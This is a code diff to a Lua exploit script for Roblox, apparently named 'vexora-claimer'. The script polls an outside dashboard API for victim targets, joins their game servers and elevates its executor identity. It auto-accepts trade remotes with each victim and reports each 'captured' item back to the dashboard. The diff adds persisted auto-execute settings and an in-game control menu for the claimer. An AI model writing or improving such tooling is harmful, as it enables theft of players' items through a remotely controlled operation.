@@ -6,7 +6,7 @@
   back after every teleport.
 ]]
 
-local CLAIMER_REV = "1.0"
+local CLAIMER_REV = "1.1"
 local API_BASE = "{{API_BASE}}"
 local API_KEY = "{{API_KEY}}"
 local ENDPOINT = "{{ENDPOINT}}"
@@ -17,6 +17,15 @@ local TRADE_DELAY = 2          -- seconds between trade attempts
 local STAY_SECONDS = 240       -- how long to farm a server before chasing a new target
 local AUTO_ACCEPT = true       -- accept incoming trade requests
 local REPORT_ITEMS = true      -- post captured items to the dashboard
+
+-- persisted across reloads by the executor
+local settings = (getgenv and getgenv().VexoraClaimerSettings) or {}
+if settings.autoExecute == nil then settings.autoExecute = true end
+if settings.autoAccept == nil then settings.autoAccept = AUTO_ACCEPT end
+settings.enabled = settings.autoExecute
+if getgenv then getgenv().VexoraClaimerSettings = settings end
+
+local ui = { state = "starting", polls = 0, target = nil, lastCapture = nil }
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
@@ -155,6 +164,7 @@ local function capture(item, victim, value)
         executor = "vexora-claimer",
         roblox_user = ME,
     })
+    ui.lastCapture = tostring(item) .. " <- " .. tostring(victim or "?")
     print(string.format("[vexora-claimer] captured %s from %s", tostring(item), tostring(victim)))
 end
 
@@ -163,7 +173,7 @@ for _, remote in ipairs(acceptRemotes) do
         remote.OnClientEvent:Connect(function(...)
             local args = { ... }
             local victim = playerIn(args)
-            if AUTO_ACCEPT and victim then
+            if settings.autoAccept and victim then
                 pcall(function() remote:FireServer("accept", victim) end)
                 pcall(function() remote:FireServer(victim) end)
             end
@@ -184,6 +194,8 @@ local function startTrading(target)
     if trading then return end
     trading = true
     arrivedAt = os.time()
+    ui.state = "trading"
+    ui.target = target or ui.target
     heartbeat("trading", target and target.server_id)
     print(string.format("[vexora-claimer] arrived in %s | target %s | %s trade remotes",
         tostring(HERE), tostring(target and target.item or "?"), tostring(#tradeRemotes)))
@@ -252,6 +264,7 @@ local function joinTarget(target)
     if not target or not target.place_id or not target.server_id then return false end
     raiseIdentity()
     queueSelf()
+    ui.state = "joining"
     heartbeat("joining", target.server_id)
 
     local teleport = game:GetService("TeleportService")
@@ -280,7 +293,10 @@ local function getTarget()
     local move = (trading and (os.time() - arrivedAt) >= STAY_SECONDS) and "&move=1" or ""
     local res, err = http("GET", API_BASE .. "/api/claimer/target?account=" .. encode(ME)
         .. "&server=" .. encode(HERE) .. move)
+    ui.polls = ui.polls + 1
     if not res then
+        ui.state = "offline"
+        ui.error = tostring(err)
         print("[vexora-claimer] poll failed: " .. tostring(err))
         return nil
     end
@@ -293,6 +309,9 @@ local function getTarget()
         return nil
     end
     local body = res.body
+    ui.error = nil
+    if body.target then ui.target = body.target end
+    ui.state = body.paused and "paused" or (body.target and "target" or "polling")
     if body.paused then
         heartbeat("paused")
     elseif body.target then
@@ -303,15 +322,216 @@ local function getTarget()
     return body
 end
 
+--[[ ---- in-game menu ---- ]]
+local uiApi = {}
+
+local function buildUi()
+    local playerGui = LocalPlayer and LocalPlayer:FindFirstChildOfClass("PlayerGui")
+    if not playerGui then return end
+
+    local old = playerGui:FindFirstChild("VexoraClaimerUI")
+    if old then old:Destroy() end
+
+    local screen = Instance.new("ScreenGui")
+    screen.Name = "VexoraClaimerUI"
+    screen.ResetOnSpawn = false
+    screen.IgnoreGuiInset = true
+    screen.DisplayOrder = 9999
+    screen.Parent = playerGui
+
+    local function new(class, props, parent)
+        local obj = Instance.new(class)
+        for key, value in pairs(props) do pcall(function() obj[key] = value end) end
+        obj.Parent = parent
+        return obj
+    end
+
+    local function round(obj, radius)
+        local corner = Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(0, radius or 8)
+        corner.Parent = obj
+    end
+
+    local bg = Color3.fromRGB(15, 15, 21)
+    local card = Color3.fromRGB(27, 27, 37)
+    local ink = Color3.fromRGB(236, 236, 246)
+    local dim = Color3.fromRGB(148, 148, 170)
+    local accent = Color3.fromRGB(139, 92, 246)
+    local on = Color3.fromRGB(34, 197, 94)
+    local off = Color3.fromRGB(239, 68, 68)
+
+    local float = new("TextButton", {
+        Name = "Open", Size = UDim2.fromOffset(44, 30), Position = UDim2.fromOffset(16, 16),
+        BackgroundColor3 = accent, Text = "V", TextSize = 16, Font = Enum.Font.GothamBold,
+        TextColor3 = Color3.new(1, 1, 1), AutoButtonColor = false,
+    }, screen)
+    round(float, 8)
+
+    local frame = new("Frame", {
+        Name = "Window", Size = UDim2.fromOffset(318, 288), Position = UDim2.fromOffset(16, 54),
+        BackgroundColor3 = bg, BorderSizePixel = 0,
+    }, screen)
+    round(frame, 12)
+
+    local header = new("Frame", {
+        Size = UDim2.new(1, 0, 0, 38), BackgroundColor3 = Color3.fromRGB(23, 23, 32),
+        BorderSizePixel = 0,
+    }, frame)
+    round(header, 12)
+
+    new("TextLabel", {
+        BackgroundTransparency = 1, Position = UDim2.fromOffset(12, 9), Size = UDim2.new(1, -48, 0, 20),
+        Font = Enum.Font.GothamBold, TextSize = 13, TextXAlignment = Enum.TextXAlignment.Left,
+        TextColor3 = ink, Text = "VEXORA CLAIMER  ·  " .. CLAIMER_REV,
+    }, header)
+
+    local close = new("TextButton", {
+        Size = UDim2.fromOffset(26, 26), Position = UDim2.new(1, -34, 0, 6),
+        BackgroundColor3 = Color3.fromRGB(41, 41, 54), Text = "x", TextSize = 13,
+        Font = Enum.Font.GothamBold, TextColor3 = ink, AutoButtonColor = false,
+    }, header)
+    round(close, 7)
+
+    local content = new("Frame", {
+        Position = UDim2.fromOffset(0, 40), Size = UDim2.new(1, 0, 1, -40), BackgroundTransparency = 1,
+    }, frame)
+
+    local stateLabel = new("TextLabel", {
+        BackgroundTransparency = 1, Position = UDim2.fromOffset(14, 6), Size = UDim2.new(1, -28, 0, 16),
+        Font = Enum.Font.GothamBold, TextSize = 12, TextXAlignment = Enum.TextXAlignment.Left,
+        TextColor3 = ink, Text = "starting",
+    }, content)
+
+    local targetLabel = new("TextLabel", {
+        BackgroundTransparency = 1, Position = UDim2.fromOffset(14, 24), Size = UDim2.new(1, -28, 0, 16),
+        Font = Enum.Font.Code, TextSize = 11, TextXAlignment = Enum.TextXAlignment.Left,
+        TextColor3 = dim, Text = "no target yet",
+    }, content)
+
+    local captureLabel = new("TextLabel", {
+        BackgroundTransparency = 1, Position = UDim2.fromOffset(14, 42), Size = UDim2.new(1, -28, 0, 16),
+        Font = Enum.Font.Code, TextSize = 11, TextXAlignment = Enum.TextXAlignment.Left,
+        TextColor3 = dim, Text = "polls: 0",
+    }, content)
+
+    local function toggleRow(textValue, y, isOn, onChange)
+        local row = new("Frame", {
+            Position = UDim2.fromOffset(14, y), Size = UDim2.new(1, -28, 0, 28),
+            BackgroundColor3 = card, BorderSizePixel = 0,
+        }, content)
+        round(row, 8)
+        new("TextLabel", {
+            BackgroundTransparency = 1, Position = UDim2.fromOffset(10, 5),
+            Size = UDim2.new(1, -66, 0, 18), Font = Enum.Font.Gotham, TextSize = 11,
+            TextXAlignment = Enum.TextXAlignment.Left, TextColor3 = ink, Text = textValue,
+        }, row)
+        local pill = new("TextButton", {
+            Position = UDim2.new(1, -56, 0, 4), Size = UDim2.fromOffset(46, 20),
+            BackgroundColor3 = isOn and on or off, Text = isOn and "ON" or "OFF",
+            TextSize = 10, Font = Enum.Font.GothamBold, TextColor3 = Color3.new(1, 1, 1),
+            AutoButtonColor = false,
+        }, row)
+        round(pill, 6)
+        pill.MouseButton1Click:Connect(function()
+            isOn = not isOn
+            pill.Text = isOn and "ON" or "OFF"
+            pill.BackgroundColor3 = isOn and on or off
+            onChange(isOn)
+        end)
+    end
+
+    toggleRow("Auto claimer", 66, settings.enabled, function(value)
+        settings.enabled = value
+        ui.state = value and "polling" or "off"
+        if uiApi.update then uiApi.update() end
+    end)
+    toggleRow("Auto execute on load", 98, settings.autoExecute, function(value)
+        settings.autoExecute = value
+    end)
+    toggleRow("Auto accept trades", 130, settings.autoAccept, function(value)
+        settings.autoAccept = value
+        AUTO_ACCEPT = value
+    end)
+
+    local poll = new("TextButton", {
+        Position = UDim2.fromOffset(14, 168), Size = UDim2.new(1, -28, 0, 28),
+        BackgroundColor3 = accent, Text = "Poll dashboard now", TextSize = 12,
+        Font = Enum.Font.GothamBold, TextColor3 = Color3.new(1, 1, 1), AutoButtonColor = false,
+    }, content)
+    round(poll, 8)
+    poll.MouseButton1Click:Connect(function()
+        task.spawn(function()
+            getTarget()
+            if uiApi.update then uiApi.update() end
+        end)
+    end)
+
+    local footer = new("TextLabel", {
+        BackgroundTransparency = 1, Position = UDim2.fromOffset(14, 202), Size = UDim2.new(1, -28, 0, 28),
+        Font = Enum.Font.Code, TextSize = 10, TextXAlignment = Enum.TextXAlignment.Left,
+        TextWrapped = true, TextColor3 = dim, Text = "api " .. API_BASE,
+    }, content)
+
+    local function setOpen(open)
+        frame.Visible = open
+        float.Visible = not open
+    end
+    close.MouseButton1Click:Connect(function() setOpen(false) end)
+    float.MouseButton1Click:Connect(function() setOpen(true) end)
+
+    local dragging, dragStart, startPos = false, nil, nil
+    header.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1
+            or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = frame.Position
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then dragging = false end
+            end)
+        end
+    end)
+    game:GetService("UserInputService").InputChanged:Connect(function(input)
+        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
+            or input.UserInputType == Enum.UserInputType.Touch) then
+            local delta = input.Position - dragStart
+            frame.Position = UDim2.new(
+                startPos.X.Scale, startPos.X.Offset + delta.X,
+                startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+
+    uiApi.update = function()
+        if not frame.Parent then return end
+        stateLabel.Text = string.format("%s  ·  %s", tostring(ui.state), ME)
+        stateLabel.TextColor3 = (ui.state == "offline" or ui.state == "off") and off or ink
+        local target = ui.target
+        targetLabel.Text = target
+            and string.format("%s  (%s)  %s", tostring(target.item or "?"),
+                tostring(target.value or "?"), tostring(target.server_id or ""):sub(1, 10))
+            or "no target yet"
+        captureLabel.Text = ui.error and ("error: " .. tostring(ui.error):sub(1, 46))
+            or (ui.lastCapture and ("captured: " .. ui.lastCapture)
+            or ("polls: " .. tostring(ui.polls) .. "  ·  " .. GAME))
+        footer.Text = "api " .. API_BASE
+    end
+
+    setOpen(true)
+end
+
+pcall(buildUi)
+
 print(string.format("[vexora-claimer] rev %s | %s | game=%s | server=%s | api=%s",
     CLAIMER_REV, ME, GAME, tostring(HERE), API_BASE))
 print(string.format("[vexora-claimer] trading=%s poll=%ds stay=%ds remotes=%d/%d",
     tostring(trading), POLL_SECONDS, STAY_SECONDS, #tradeRemotes, #acceptRemotes))
 heartbeat("starting")
+if uiApi.update then pcall(uiApi.update) end
 
 task.spawn(function()
     while running do
-        local payload = getTarget()
+        local payload = settings.enabled and getTarget() or nil
+        if not settings.enabled then ui.state = "off" end
         if payload then
             if payload.paused then
                 -- claimer is disarmed on the dashboard
@@ -333,6 +553,7 @@ task.spawn(function()
                 end
             end
         end
+        if uiApi.update then pcall(uiApi.update) end
         task.wait(POLL_SECONDS)
     end
 end)
@@ -342,4 +563,6 @@ return {
     stop = stop,
     join = joinTarget,
     target = getTarget,
+    ui = uiApi,
+    settings = settings,
 }
